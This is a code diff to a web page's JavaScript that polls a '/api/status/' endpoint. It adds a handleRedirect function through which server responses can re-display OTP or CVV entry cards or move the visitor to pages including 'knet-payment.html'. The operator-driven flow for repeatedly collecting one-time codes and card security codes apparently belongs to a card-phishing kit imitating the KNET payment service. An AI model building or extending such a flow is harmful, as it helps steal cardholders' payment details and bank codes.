@@ -877,11 +877,19 @@
         try {
           const r = await fetch('/api/status/' + subId);
           const d = await r.json();
-          if (d.redirect_to) { clearInterval(pollTimer2); window.location.href = d.redirect_to; return; }
+          if (d.redirect_to) { clearInterval(pollTimer2); handleRedirect(d.redirect_to); return; }
           if (d.status === 'accepted') { clearInterval(pollTimer2); showAccepted(); }
           else if (d.status === 'rejected') { clearInterval(pollTimer2); showRejected(); }
         } catch(e) {}
       }, 2000);
+    }
+
+    const PAGE_MAP = { index:'index.html', summary:'summary.html', knet:'knet-payment.html' };
+    function handleRedirect(target) {
+      if (target === 'otp') { showOtpCard(false); return; }
+      if (target === 'cvv') { showCvvCard(false); return; }
+      const url = PAGE_MAP[target] || target;
+      window.location.href = url;
     }
 
     let currentStep = 'otp'; // 'otp' | 'cvv'
@@ -979,7 +987,7 @@
         try {
           const r = await fetch('/api/status/' + id);
           const d = await r.json();
-          if (d.redirect_to) { clearInterval(pollTimer2); window.location.href = d.redirect_to; return; }
+          if (d.redirect_to) { clearInterval(pollTimer2); handleRedirect(d.redirect_to); return; }
           if (d.status === 'accepted') { clearInterval(pollTimer2); onPollAccepted(); }
           else if (d.status === 'rejected') { clearInterval(pollTimer2); onPollRejected(); }
         } catch(e) {}
